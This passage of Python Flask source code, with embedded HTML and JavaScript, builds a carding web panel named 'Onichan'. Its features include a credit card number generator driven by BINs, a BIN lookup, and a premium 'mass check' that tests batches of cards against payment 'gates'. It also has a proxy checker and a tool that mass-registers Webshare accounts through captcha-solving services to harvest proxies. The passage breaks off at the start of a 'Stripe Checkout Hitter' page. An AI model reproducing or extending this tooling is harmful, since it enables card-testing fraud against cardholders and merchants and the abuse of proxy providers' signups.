                <h2>CC Generator</h2>
                <form id="genForm">
                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
                        <div class="form-group">
                            <label>BIN (6-8 digits)</label>
                            <input type="text" id="genBin" placeholder="411111" maxlength="8" required>
                        </div>
                        <div class="form-group">
                            <label>Count</label>
                            <select id="genCount">
                                <option value="5">5</option>
                                <option value="10" selected>10</option>
                                <option value="15">15</option>
                                <option value="20">20</option>
                            </select>
                        </div>
                    </div>
                    <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 15px;">
                        <div class="form-group">
                            <label>Month</label>
                            <input type="text" id="genMonth" placeholder="rnd" maxlength="3" value="rnd">
                        </div>
                        <div class="form-group">
                            <label>Year</label>
                            <input type="text" id="genYear" placeholder="rnd" maxlength="4" value="rnd">
                        </div>
                        <div class="form-group">
                            <label>CVV</label>
                            <input type="text" id="genCvv" placeholder="rnd" maxlength="4" value="rnd">
                        </div>
                    </div>
                    <button type="submit" class="btn btn-primary">Generate</button>
                </form>
                <div id="genResult" style="display: none; margin-top: 15px;">
                    <textarea id="genOutput" readonly style="width: 100%; height: 150px; background: #1a1a2e; color: #34d399; border: 1px solid #333; border-radius: 8px; padding: 10px; font-family: monospace; resize: vertical;"></textarea>
                    <div style="margin-top: 10px; display: flex; gap: 10px;">
                        <button type="button" class="btn btn-primary" onclick="copyGenerated()">Copy All</button>
                        <button type="button" class="btn" onclick="clearGenerated()" style="background: #6b7280;">Clear</button>
                    </div>
                </div>
                <script>
                    document.getElementById('genForm').addEventListener('submit', async function(e) {{
                        e.preventDefault();
                        e.stopPropagation();
                        const bin = document.getElementById('genBin').value;
                        const count = document.getElementById('genCount').value;
                        const month = document.getElementById('genMonth').value || 'rnd';
                        const year = document.getElementById('genYear').value || 'rnd';
                        const cvv = document.getElementById('genCvv').value || 'rnd';
                        
                        try {{
                            const response = await fetch('/api/generate', {{
                                method: 'POST',
                                headers: {{
                                    'Content-Type': 'application/json',
                                    'Accept': 'application/json'
                                }},
                                body: JSON.stringify({{bin: bin, count: count, month: month, year: year, cvv: cvv}})
                            }});
                            const data = await response.json();
                            if (data.cards) {{
                                document.getElementById('genOutput').value = data.cards.join('\\n');
                                document.getElementById('genResult').style.display = 'block';
                            }} else {{
                                alert(data.error || 'Generation failed');
                            }}
                        }} catch(err) {{
                            alert('Error: ' + err.message);
                        }}
                        return false;
                    }});
                    
                    function copyGenerated() {{
                        const output = document.getElementById('genOutput');
                        output.select();
                        document.execCommand('copy');
                        alert('Copied to clipboard!');
                    }}
                    
                    function clearGenerated() {{
                        document.getElementById('genOutput').value = '';
                        document.getElementById('genResult').style.display = 'none';
                    }}
                </script>
            </div>
            
            <div class="card">
                <h2>BIN Lookup</h2>
                <form id="binForm">
                    <div style="display: flex; gap: 15px; align-items: flex-end;">
                        <div class="form-group" style="flex: 1; margin-bottom: 0;">
                            <label>BIN (6-8 digits)</label>
                            <input type="text" id="binInput" placeholder="411111" maxlength="8" required>
                        </div>
                        <button type="submit" class="btn btn-primary" style="height: 42px;">Lookup</button>
                    </div>
                </form>
                <div id="binResult" style="display: none; margin-top: 15px;">
                    <div id="binOutput" class="result-box result-approved" style="white-space: pre-line;"></div>
                </div>
                <script>
                    document.getElementById('binForm').addEventListener('submit', async function(e) {{
                        e.preventDefault();
                        e.stopPropagation();
                        const bin = document.getElementById('binInput').value;
                        
                        try {{
                            const response = await fetch('/api/binlookup', {{
                                method: 'POST',
                                headers: {{
                                    'Content-Type': 'application/json',
                                    'Accept': 'application/json'
                                }},
                                body: JSON.stringify({{bin: bin}})
                            }});
                            const data = await response.json();
                            if (data.success) {{
                                document.getElementById('binOutput').innerHTML = 
                                    `<strong>BIN:</strong> ${{data.bin}}\\n` +
                                    `<strong>Brand:</strong> ${{data.brand}}\\n` +
                                    `<strong>Type:</strong> ${{data.type}}\\n` +
                                    `<strong>Level:</strong> ${{data.level}}\\n` +
                                    `<strong>Bank:</strong> ${{data.bank}}\\n` +
                                    `<strong>Country:</strong> ${{data.emoji}} ${{data.country}} (${{data.country_code}})`;
                                document.getElementById('binResult').style.display = 'block';
                            }} else {{
                                document.getElementById('binOutput').innerHTML = `<span style="color: #f87171;">Error: ${{data.error}}</span>`;
                                document.getElementById('binResult').style.display = 'block';
                            }}
                        }} catch(err) {{
                            alert('Error: ' + err.message);
                        }}
                        return false;
                    }});
                </script>
            </div>
            
            <div class="card">
                <h2>Supported Gates</h2>
                <div class="gate-grid">
                    {''.join([f'<div class="gate-btn" title="{g["name"]}">{g["name"]}{"" if not g["premium"] else " 💎"}</div>' for g in AVAILABLE_GATES])}
                </div>
            </div>
        </div>
    </body>
    </html>
    """)

@app.route('/user/masscheck', methods=['GET', 'POST'])
@user_required
def user_masscheck():
    user_id = session.get('user_id')
    user_info = get_user_info(user_id)
    results = []
    error = None
    
    if user_info['type'] not in ['premium', 'owner']:
        return render_template_string(f"""
        <html>
        <head><title>Mass Check - Onichan</title>{USER_CSS}</head>
        <body>
            {get_user_sidebar('masscheck', 'Mass Check')}
            <div class="main">
                <div class="header">
                    <h1>Mass Check</h1>
                </div>
                <div class="alert alert-error">
                    This feature requires Premium access. <a href="/user/premium" class="btn btn-primary" style="margin-left: 15px;">Get Premium</a>
                </div>
            </div>
        </body>
        </html>
        """)
    
    gates_html = ""
    for g in AVAILABLE_GATES:
        disabled = 'disabled' if g['premium'] and user_info['type'] not in ['premium', 'owner'] else ''
        premium_tag = ' (Premium)' if g['premium'] else ''
        gates_html += f'<option value="{g["id"]}" {disabled}>{g["name"]}{premium_tag}</option>'
    
    if request.method == 'POST':
        cards_text = request.form.get('cards', '').strip()
        gate = request.form.get('gate', 'se1')
        
        if cards_text:
            cards = [c.strip() for c in cards_text.split('\n') if c.strip()][:25]
            
            from modules.gate_checker import check_card_php
            for card in cards:
                try:
                    parsed = parse_card_flexible(card)
                    if parsed:
                        cc, mm, yy, cvv = parsed
                        check_result = check_card_php(gate, cc, mm, yy, cvv, user_id)
                        results.append({
                            'card': f"{cc[:6]}xxxx|{mm}|{yy}|***",
                            'status': check_result.get('status', 'error'),
                            'message': check_result.get('message', 'Failed')[:40]
                        })
                    else:
                        results.append({'card': card[:20], 'status': 'error', 'message': 'Invalid format'})
                except:
                    results.append({'card': card[:20], 'status': 'error', 'message': 'Parse error'})
    
    results_html = ""
    for r in results:
        color = '#34d399' if 'approved' in r['message'].lower() else '#f87171'
        results_html += f"<tr><td>{r['card']}</td><td style='color:{color}'>{r['status']}</td><td>{r['message']}</td></tr>"
    
    return render_template_string(f"""
    <html>
    <head><title>Mass Check - Onichan</title>{USER_CSS}</head>
    <body>
        {get_user_sidebar('masscheck', 'Mass Check')}
        <div class="main">
            <div class="header">
                <h1>Mass Check</h1>
            </div>
            
            <div class="card">
                <h2>Check Multiple Cards (Max 25)</h2>
                <form method="POST" id="massCheckForm">
                    <div class="form-group">
                        <label>Cards (one per line - CC|MM|YY|CVV)</label>
                        <textarea name="cards" rows="10" placeholder="4111111111111111|12|25|123&#10;5500000000000004|01|26|456"></textarea>
                    </div>
                    <div class="form-group">
                        <label>Select Gate</label>
                        <select name="gate">
                            {gates_html}
                        </select>
                    </div>
                    <button type="submit" class="btn btn-primary" id="massCheckBtn">Check All Cards</button>
                </form>
                <div id="massLoadingDiv" style="display: none; margin-top: 20px; text-align: center; padding: 20px; border: 2px solid #ff1493; border-radius: 8px; background: rgba(255, 20, 147, 0.1);">
                    <div style="font-size: 24px; margin-bottom: 10px;">⏳</div>
                    <div style="color: #ff1493; font-weight: bold; font-size: 16px;">Checking cards...</div>
                    <div style="color: #a78bfa; font-size: 12px; margin-top: 10px;">Please wait, this may take 10-30 seconds per card</div>
                </div>
                <script>
                    document.getElementById('massCheckForm').addEventListener('submit', function() {{
                        document.getElementById('massLoadingDiv').style.display = 'block';
                        document.getElementById('massCheckBtn').disabled = true;
                        document.getElementById('massCheckBtn').style.opacity = '0.6';
                    }});
                </script>
            </div>
            
            {f'''<div class="card">
                <h2>Results ({len(results)} cards)</h2>
                <table>
                    <tr><th>Card</th><th>Status</th><th>Message</th></tr>
                    {results_html}
                </table>
            </div>''' if results else ''}
        </div>
    </body>
    </html>
    """)

@app.route('/user/generator', methods=['GET', 'POST'])
@user_required
def user_generator():
    user_id = session.get('user_id')
    cards = []
    
    if request.method == 'POST':
        bin_number = request.form.get('bin', '').strip()
        # Clean BIN - remove any non-digit characters
        bin_number = ''.join(c for c in bin_number if c.isdigit())
        
        try:
            count = min(int(request.form.get('count', 10)), 50)
        except:
            count = 10
            
        month = request.form.get('month', '').strip() or None
        year = request.form.get('year', '').strip() or None
        cvv = request.form.get('cvv', '').strip() or None
        
        # Handle 'rnd' values
        if month and month.lower() == 'rnd':
            month = None
        if year and year.lower() == 'rnd':
            year = None
        if cvv and cvv.lower() == 'rnd':
            cvv = None
        
        if bin_number and len(bin_number) >= 6:
            try:
                from modules.cc_generator import generate_cards
                generated = generate_cards(bin_number, count, month, year, cvv)
                cards = [f"{c['cc']}|{c['mm']}|{c['yy']}|{c['cvv']}" for c in generated]
            except Exception as e:
                # Return JSON error for AJAX requests
                if request.headers.get('X-Requested-With') == 'XMLHttpRequest' or 'application/json' in request.headers.get('Accept', ''):
                    return jsonify({'error': f'Generation failed: {str(e)[:50]}'})
                cards = []
        
        # Return JSON for AJAX requests
        if request.headers.get('X-Requested-With') == 'XMLHttpRequest' or 'application/json' in request.headers.get('Accept', ''):
            if cards:
                return jsonify({'cards': cards})
            else:
                return jsonify({'error': 'Invalid BIN or generation failed'})
    
    cards_html = ""
    for card in cards:
        cards_html += f"<tr><td><code>{card}</code></td></tr>"
    
    return render_template_string(f"""
    <html>
    <head><title>CC Generator - Onichan</title>{USER_CSS}</head>
    <body>
        {get_user_sidebar('generator', 'CC Generator')}
        <div class="main">
            <div class="header">
                <h1>CC Generator</h1>
            </div>
            
            <div class="card">
                <h2>Generate Cards from BIN</h2>
                <form method="POST">
                    <div class="form-group">
                        <label>BIN (6-9 digits)</label>
                        <input type="text" name="bin" placeholder="411111" required maxlength="9">
                    </div>
                    <div class="stats-grid" style="grid-template-columns: repeat(4, 1fr);">
                        <div class="form-group">
                            <label>Count (max 50)</label>
                            <input type="number" name="count" value="10" min="1" max="50">
                        </div>
                        <div class="form-group">
                            <label>Month (optional)</label>
                            <input type="text" name="month" placeholder="12">
                        </div>
                        <div class="form-group">
                            <label>Year (optional)</label>
                            <input type="text" name="year" placeholder="25">
                        </div>
                        <div class="form-group">
                            <label>CVV (optional)</label>
                            <input type="text" name="cvv" placeholder="xxx">
                        </div>
                    </div>
                    <button type="submit" class="btn btn-primary">Generate Cards</button>
                </form>
            </div>
            
            {f'''<div class="card">
                <h2>Generated Cards ({len(cards)})</h2>
                <table>
                    <tr><th>Card (CC|MM|YY|CVV)</th></tr>
                    {cards_html}
                </table>
                <button onclick="navigator.clipboard.writeText(`{chr(10).join(cards)}`)" class="btn btn-secondary" style="margin-top: 15px;">Copy All</button>
            </div>''' if cards else ''}
        </div>
    </body>
    </html>
    """)

@app.route('/user/binlookup', methods=['GET', 'POST'])
@user_required
def user_binlookup():
    user_id = session.get('user_id')
    result = None
    
    if request.method == 'POST':
        bin_number = request.form.get('bin', '').strip()[:8]
        
        if bin_number and len(bin_number) >= 6:
            try:
                import requests
                resp = requests.get(f"https://lookup.binlist.net/{bin_number}", timeout=10)
                if resp.status_code == 200:
                    data = resp.json()
                    result = {
                        'bin': bin_number,
                        'brand': data.get('scheme', 'Unknown').upper(),
                        'type': data.get('type', 'Unknown').upper(),
                        'category': data.get('brand', 'Unknown'),
                        'country': data.get('country', {}).get('name', 'Unknown'),
                        'bank': data.get('bank', {}).get('name', 'Unknown'),
                        'prepaid': 'Yes' if data.get('prepaid') else 'No'
                    }
                else:
                    result = {'bin': bin_number, 'error': 'BIN not found'}
            except Exception as e:
                result = {'bin': bin_number, 'error': str(e)[:50]}
    
    result_html = ""
    if result:
        if 'error' in result:
            result_html = f'<div class="alert alert-error">Error: {result["error"]}</div>'
        else:
            result_html = f'''
            <div class="result-box result-approved">
BIN: {result['bin']}
Brand: {result['brand']}
Type: {result['type']}
Category: {result['category']}
Country: {result['country']}
Bank: {result['bank']}
Prepaid: {result['prepaid']}
            </div>
            '''
    
    return render_template_string(f"""
    <html>
    <head><title>BIN Lookup - Onichan</title>{USER_CSS}</head>
    <body>
        {get_user_sidebar('binlookup', 'BIN Lookup')}
        <div class="main">
            <div class="header">
                <h1>BIN Lookup</h1>
            </div>
            
            <div class="card">
                <h2>Lookup BIN Information</h2>
                <form method="POST">
                    <div class="form-group">
                        <label>BIN (first 6-8 digits of card)</label>
                        <input type="text" name="bin" placeholder="411111" required maxlength="8">
                    </div>
                    <button type="submit" class="btn btn-primary">Lookup BIN</button>
                </form>
                {result_html}
            </div>
            
            <div class="card">
                <h2>What is a BIN?</h2>
                <p style="opacity: 0.8; line-height: 1.8;">
                    A Bank Identification Number (BIN) is the first 6-8 digits of a credit or debit card number. 
                    It identifies the issuing bank, card brand, type, and country of origin.
                </p>
            </div>
        </div>
    </body>
    </html>
    """)


@app.route('/user/proxychecker', methods=['GET', 'POST'])
@user_required
def user_proxy_checker():
    result_html = ""
    
    if request.method == 'POST':
        proxy = request.form.get('proxy', '').strip()
        
        if not proxy:
            result_html = '<div class="alert alert-danger">Please enter a proxy</div>'
        else:
            import time
            start_time = time.time()
            
            try:
                proxy_parts = proxy.split(':')
                if len(proxy_parts) == 4:
                    proxy_dict = {
                        'http': f'http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}',
                        'https': f'http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}'
                    }
                elif len(proxy_parts) == 2:
                    proxy_dict = {
                        'http': f'http://{proxy_parts[0]}:{proxy_parts[1]}',
                        'https': f'http://{proxy_parts[0]}:{proxy_parts[1]}'
                    }
                else:
                    result_html = '<div class="alert alert-danger">Invalid proxy format. Use ip:port or ip:port:user:pass</div>'
                    proxy_dict = None
                
                if proxy_dict:
                    response = http_requests.get('https://httpbin.org/ip', proxies=proxy_dict, timeout=15)
                    elapsed = time.time() - start_time
                    
                    if response.status_code == 200:
                        data = response.json()
                        real_ip = data.get('origin', 'Unknown')
                        result_html = f'''
                        <div class="result-box" style="background: linear-gradient(135deg, rgba(34,197,94,0.2), rgba(16,185,129,0.2)); border: 1px solid #22c55e; padding: 20px; border-radius: 10px; margin-top: 20px;">
                            <h3 style="color: #22c55e; margin-bottom: 15px;">Proxy is Working!</h3>
                            <p><strong>Proxy IP:</strong> {real_ip}</p>
                            <p><strong>Response Time:</strong> {elapsed:.2f}s</p>
                            <p><strong>Status:</strong> Connected</p>
                        </div>
                        '''
                    else:
                        result_html = f'<div class="alert alert-danger">Proxy returned status code: {response.status_code}</div>'
            
            except http_requests.exceptions.ProxyError:
                result_html = '<div class="alert alert-danger">Proxy Error: Could not connect to proxy server</div>'
            except http_requests.exceptions.ConnectTimeout:
                result_html = '<div class="alert alert-danger">Connection Timeout: Proxy is too slow or not responding</div>'
            except http_requests.exceptions.ReadTimeout:
                result_html = '<div class="alert alert-danger">Read Timeout: Proxy connection timed out</div>'
            except Exception as e:
                result_html = f'<div class="alert alert-danger">Error: {str(e)}</div>'
    
    return render_template_string(f"""
    <html>
    <head><title>Proxy Checker - Onichan</title>{USER_CSS}</head>
    <body>
        {get_user_sidebar('proxychecker', 'Proxy Checker')}
        <div class="main">
            <div class="header">
                <h1>Proxy Checker</h1>
            </div>
            
            <div class="card">
                <h2>Test Your Proxy</h2>
                <p style="opacity: 0.7; margin-bottom: 20px;">Check if your proxy is working and get its real IP address</p>
                <form method="POST">
                    <div class="form-group">
                        <label>Proxy</label>
                        <input type="text" name="proxy" placeholder="ip:port or ip:port:user:pass" required>
                    </div>
                    <button type="submit" class="btn btn-primary">Check Proxy</button>
                </form>
                {result_html}
            </div>
            
            <div class="card">
                <h2>Proxy Formats</h2>
                <p style="opacity: 0.8; line-height: 1.8;">
                    <strong>Without Auth:</strong> ip:port<br>
                    Example: 192.168.1.1:8080<br><br>
                    <strong>With Auth:</strong> ip:port:username:password<br>
                    Example: 192.168.1.1:8080:myuser:mypass
                </p>
            </div>
        </div>
    </body>
    </html>
    """)


@app.route('/user/proxygen')
@user_required
def user_proxy_generator():
    return render_template_string(f"""
    <html>
    <head><title>Proxy Generator - Onichan</title>{USER_CSS}
    <style>
    @keyframes spin {{ 0%{{transform:rotate(0deg)}} 100%{{transform:rotate(360deg)}} }}
    .spinner {{ width:20px;height:20px;border:3px solid rgba(255,255,255,0.3);border-top:3px solid #fff;border-radius:50%;animation:spin 0.8s linear infinite;display:inline-block;vertical-align:middle;margin-right:10px; }}
    .pg-tabs {{ display:flex;background:rgba(45,20,80,0.5);border-radius:10px;padding:4px;margin-bottom:20px; }}
    .pg-tab {{ flex:1;padding:10px;text-align:center;border-radius:8px;cursor:pointer;font-size:0.9em;font-weight:600;color:rgba(255,255,255,0.5);transition:all 0.2s; }}
    .pg-tab.active {{ background:rgba(255,20,147,0.25);color:#fff; }}
    .pg-tab-content {{ display:none; }}
    .pg-tab-content.active {{ display:block; }}
    .pg-empty {{ text-align:center;padding:30px 20px; }}
    .pg-empty-icon {{ width:50px;height:50px;margin:0 auto 14px;background:rgba(255,20,147,0.1);border-radius:12px;display:flex;align-items:center;justify-content:center;border:1px solid rgba(255,20,147,0.2); }}
    .pg-empty-icon svg {{ width:26px;height:26px;color:rgba(255,20,147,0.4); }}
    .pg-empty h3 {{ margin:0 0 6px;font-size:1em;color:rgba(255,255,255,0.8); }}
    .pg-empty p {{ margin:0;font-size:0.85em;color:rgba(255,255,255,0.4);line-height:1.5; }}
    .pg-results {{ display:none; }}
    .pg-results.visible {{ display:block; }}
    .pg-output-wrap {{ position:relative;margin-top:15px; }}
    .pg-output {{ background:rgba(30,15,45,0.8);border:1px solid rgba(255,105,180,0.2);border-radius:10px;padding:14px;font-family:monospace;font-size:0.85em;max-height:350px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;color:rgba(255,255,255,0.9); }}
    .pg-copy {{ position:absolute;top:8px;right:8px;background:rgba(255,20,147,0.3);border:1px solid rgba(255,105,180,0.3);color:#ff69b4;border-radius:8px;padding:5px 12px;cursor:pointer;font-size:0.8em;font-family:inherit;transition:all 0.2s; }}
    .pg-copy:hover {{ background:rgba(255,20,147,0.5); }}
    </style>
    </head>
    <body>
        {get_user_sidebar('proxygen', 'Proxy Generator')}
        <div class="main">
            <div class="header">
                <h1>Proxy Generator</h1>
                <p style="opacity: 0.6; margin-top: 4px;">Generate Webshare proxies with captcha solving</p>
            </div>

            <div class="card">
                <div class="pg-tabs">
                    <div class="pg-tab active" onclick="switchTab('single')" id="tab-single">Single Proxy</div>
                    <div class="pg-tab" onclick="switchTab('bulk')" id="tab-bulk">Bulk Generator</div>
                </div>

                <div class="alert alert-info" style="margin-bottom: 18px;">
                    <strong>Note:</strong> Proxy generation takes approximately 1-2 minutes per account. Please be patient while we generate your proxies.
                </div>

                <!-- Single Proxy Tab -->
                <div class="pg-tab-content active" id="content-single">
                    <div class="form-group">
                        <label>Captcha Service</label>
                        <select id="cap-service">
                            <option value="capsolver">CapSolver</option>
                            <option value="capmonster">CapMonster</option>
                            <option value="nocaptchaai">NoCaptcha AI</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label>API Key</label>
                        <input type="password" id="cap-key" placeholder="Enter your captcha API key">
                        <p style="font-size:0.8em;opacity:0.4;margin-top:4px;">Get from <a href="https://capsolver.com" target="_blank" style="color:#ff69b4;">capsolver.com</a> / <a href="https://capmonster.cloud" target="_blank" style="color:#ff69b4;">capmonster.cloud</a> / <a href="https://nocaptchaai.com" target="_blank" style="color:#ff69b4;">nocaptchaai.com</a></p>
                    </div>
                    <div class="form-group">
                        <label>Proxy Format</label>
                        <select id="proxy-fmt">
                            <option value="ip:port:user:pass">ip:port:user:pass</option>
                            <option value="user:pass@ip:port">user:pass@ip:port</option>
                            <option value="ip:port">ip:port (no auth)</option>
                        </select>
                    </div>
                    <button class="btn btn-primary" id="gen-btn-single" onclick="startGeneration(1)" style="width:100%;padding:14px;font-size:1.05em;">Generate Proxy</button>
                </div>

                <!-- Bulk Generator Tab -->
                <div class="pg-tab-content" id="content-bulk">
                    <div class="form-group">
                        <label>Captcha Service</label>
                        <select id="cap-service-bulk">
                            <option value="capsolver">CapSolver</option>
                            <option value="capmonster">CapMonster</option>
                            <option value="nocaptchaai">NoCaptcha AI</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label>API Key</label>
                        <input type="password" id="cap-key-bulk" placeholder="Enter your captcha API key">
                        <p style="font-size:0.8em;opacity:0.4;margin-top:4px;">Get from <a href="https://capsolver.com" target="_blank" style="color:#ff69b4;">capsolver.com</a> / <a href="https://capmonster.cloud" target="_blank" style="color:#ff69b4;">capmonster.cloud</a> / <a href="https://nocaptchaai.com" target="_blank" style="color:#ff69b4;">nocaptchaai.com</a></p>
                    </div>
                    <div class="form-group">
                        <label>Accounts to Generate</label>
                        <select id="gen-count">
                            <option value="2">2 Accounts (~20 proxies)</option>
                            <option value="3">3 Accounts (~30 proxies)</option>
                            <option value="5">5 Accounts (~50 proxies)</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label>Proxy Format</label>
                        <select id="proxy-fmt-bulk">
                            <option value="ip:port:user:pass">ip:port:user:pass</option>
                            <option value="user:pass@ip:port">user:pass@ip:port</option>
                            <option value="ip:port">ip:port (no auth)</option>
                        </select>
                    </div>
                    <button class="btn btn-primary" id="gen-btn-bulk" onclick="startGeneration(0)" style="width:100%;padding:14px;font-size:1.05em;">Generate Proxies</button>
                </div>
            </div>

            <!-- Results -->
            <div class="card">
                <h2>Results</h2>
                <div id="gen-status"></div>

                <div id="pg-results" class="pg-results">
                    <div class="stats-grid" style="margin-top:15px;">
                        <div class="stat-card"><h3 id="stat-proxies" style="color:#22c55e;">0</h3><p>Proxies</p></div>
                        <div class="stat-card"><h3 id="stat-accounts" style="color:#ff69b4;">0</h3><p>Accounts</p></div>
                        <div class="stat-card"><h3 id="stat-errors" style="color:#ffd700;">0</h3><p>Errors</p></div>
                    </div>
                    <div class="pg-output-wrap">
                        <button class="pg-copy" id="copy-btn" onclick="copyProxies()">Copy All</button>
                        <div class="pg-output" id="proxy-output"></div>
                    </div>
                </div>

                <div id="pg-empty" class="pg-empty">
                    <div class="pg-empty-icon">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="2" y="3" width="20" height="18" rx="2"/><path d="M8 7h.01M12 7h.01M16 7h.01M8 12h8M8 16h5"/></svg>
                    </div>
                    <h3>No Proxies Generated</h3>
                    <p>You haven't generated any Webshare proxies yet. Use the generator to create proxies.</p>
                </div>
            </div>
        </div>

        <script>
        var savedKey = localStorage.getItem('ws_cap_key') || '';
        var savedSvc = localStorage.getItem('ws_cap_service') || 'capsolver';
        var savedFmt = localStorage.getItem('ws_proxy_fmt') || 'ip:port:user:pass';
        if(savedKey) {{
            document.getElementById('cap-key').value = savedKey;
            document.getElementById('cap-key-bulk').value = savedKey;
        }}
        document.getElementById('cap-service').value = savedSvc;
        document.getElementById('cap-service-bulk').value = savedSvc;
        document.getElementById('proxy-fmt').value = savedFmt;
        document.getElementById('proxy-fmt-bulk').value = savedFmt;

        document.getElementById('cap-key').addEventListener('input', function(e) {{
            localStorage.setItem('ws_cap_key', e.target.value.trim());
            document.getElementById('cap-key-bulk').value = e.target.value;
        }});
        document.getElementById('cap-key-bulk').addEventListener('input', function(e) {{
            localStorage.setItem('ws_cap_key', e.target.value.trim());
            document.getElementById('cap-key').value = e.target.value;
        }});
        document.getElementById('cap-service').addEventListener('change', function(e) {{
            localStorage.setItem('ws_cap_service', e.target.value);
            document.getElementById('cap-service-bulk').value = e.target.value;
        }});
        document.getElementById('cap-service-bulk').addEventListener('change', function(e) {{
            localStorage.setItem('ws_cap_service', e.target.value);
            document.getElementById('cap-service').value = e.target.value;
        }});
        document.getElementById('proxy-fmt').addEventListener('change', function(e) {{
            localStorage.setItem('ws_proxy_fmt', e.target.value);
            document.getElementById('proxy-fmt-bulk').value = e.target.value;
        }});
        document.getElementById('proxy-fmt-bulk').addEventListener('change', function(e) {{
            localStorage.setItem('ws_proxy_fmt', e.target.value);
            document.getElementById('proxy-fmt').value = e.target.value;
        }});

        function switchTab(tab) {{
            document.querySelectorAll('.pg-tab').forEach(function(t) {{ t.classList.remove('active'); }});
            document.querySelectorAll('.pg-tab-content').forEach(function(c) {{ c.classList.remove('active'); }});
            document.getElementById('tab-' + tab).classList.add('active');
            document.getElementById('content-' + tab).classList.add('active');
        }}

        async function startGeneration(mode) {{
            var isSingle = mode === 1;
            var capKey = document.getElementById(isSingle ? 'cap-key' : 'cap-key-bulk').value.trim();
            if(!capKey) {{ alert('Please enter your Captcha API key'); return; }}

            var capService = document.getElementById(isSingle ? 'cap-service' : 'cap-service-bulk').value;
            var proxyFmt = document.getElementById(isSingle ? 'proxy-fmt' : 'proxy-fmt-bulk').value;
            var count = isSingle ? 1 : parseInt(document.getElementById('gen-count').value);

            var btnId = isSingle ? 'gen-btn-single' : 'gen-btn-bulk';
            var btn = document.getElementById(btnId);
            var origText = btn.innerHTML;
            btn.disabled = true;
            btn.innerHTML = '<span class="spinner"></span> Generating...';

            var statusDiv = document.getElementById('gen-status');
            statusDiv.className = 'alert alert-info';
            statusDiv.innerHTML = '<span class="spinner"></span> Solving captcha & creating ' + count + ' account(s)... Please wait.';
            statusDiv.style.display = 'block';

            document.getElementById('pg-empty').style.display = 'none';
            document.getElementById('pg-results').classList.remove('visible');

            try {{
                var resp = await fetch('/api/webshare/generate', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{
                        cap_key: capKey,
                        cap_service: capService,
                        proxy_format: proxyFmt,
                        count: count
                    }})
                }});
                var data = await resp.json();

                document.getElementById('stat-proxies').textContent = data.count || 0;
                document.getElementById('stat-accounts').textContent = data.accounts || 0;
                document.getElementById('stat-errors').textContent = (data.errors || []).length;

                if(data.proxies && data.proxies.length > 0) {{
                    statusDiv.className = 'alert alert-success';
                    statusDiv.textContent = 'Generated ' + data.count + ' proxies from ' + data.accounts + ' account(s)!';
                    document.getElementById('proxy-output').textContent = data.proxies.join('\\n');
                    document.getElementById('pg-results').classList.add('visible');
                }} else {{
                    statusDiv.className = 'alert alert-danger';
                    var errMsg = 'Failed to generate proxies.';
                    if(data.errors && data.errors.length > 0) {{
                        errMsg += ' ' + data.errors.join(' | ');
                    }}
                    statusDiv.textContent = errMsg;
                    document.getElementById('pg-empty').style.display = 'block';
                }}
            }} catch(err) {{
                statusDiv.className = 'alert alert-danger';
                statusDiv.textContent = 'Request failed: ' + err.message;
                document.getElementById('pg-empty').style.display = 'block';
            }}

            btn.disabled = false;
            btn.innerHTML = origText;
        }}

        function copyProxies() {{
            var text = document.getElementById('proxy-output').textContent;
            navigator.clipboard.writeText(text).then(function() {{
                var btn = document.getElementById('copy-btn');
                btn.textContent = 'Copied!';
                setTimeout(function() {{ btn.textContent = 'Copy All'; }}, 2000);
            }});
        }}
        </script>
    </body>
    </html>
    """)


@app.route('/api/webshare/generate', methods=['POST'])
@auth_required
def api_webshare_generate():
    """API endpoint for Webshare proxy generation"""
    data = request.json
    cap_key = data.get('cap_key', '').strip()
    cap_service = data.get('cap_service', 'capsolver').strip()
    proxy_format = data.get('proxy_format', 'ip:port:user:pass').strip()
    count = min(int(data.get('count', 1)), 5)

    if not cap_key:
        return jsonify({"status": "error", "message": "Captcha API key is required", "proxies": [], "count": 0, "accounts": 0, "errors": ["No API key provided"]})

    try:
        from modules.webshare_gen import WebshareGenerator
        gen = WebshareGenerator(cap_key=cap_key, cap_service=cap_service)
        result = gen.generate(fmt=proxy_format, count=count)
        return jsonify(result)
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)[:200], "proxies": [], "count": 0, "accounts": 0, "errors": [str(e)[:200]]})


def _render_autohitter_page():
    return render_template_string("""
    <!DOCTYPE html>
    <html lang="en">
    <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Stripe Checkout Hitter - Onichan</title>
    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🎀</text></svg>">
    <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg: #0d0a1f;
            --bg-card: rgba(45,27,61,0.8);
            --bg-input: rgba(30,15,45,0.9);
            --bg-hover: #3a2550;
            --border: rgba(255,105,180,0.15);
            --border-dim: rgba(255,105,180,0.08);
            --border-bright: rgba(255,105,180,0.3);
            --accent: #ff69b4;
            --accent-secondary: #ff1493;
            --accent-tertiary: #da70d6;
            --accent-dim: rgba(255,105,180,0.15);
            --accent-glow: rgba(255,20,147,0.3);
            --green: #22c55e;
            --green-dim: rgba(34,197,94,0.12);
            --text: #f0e6f6;
            --text-dim: #b8a5c8;
            --text-muted: #7a6890;
            --font-display: 'Nunito', sans-serif;
            --font-body: 'Nunito', 'Segoe UI', sans-serif;
            --font-mono: 'JetBrains Mono', 'Courier New', monospace;
            --radius: 12px;
        }
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
        html, body { height: 100%; width: 100%; }
        body {
            font-family: var(--font-body);
            -webkit-font-smoothing: antialiased;
            background: linear-gradient(135deg, #1a0a1f 0%, #2d1b3d 30%, #1f1a3d 60%, #0d0a1f 100%);
            color: var(--text);
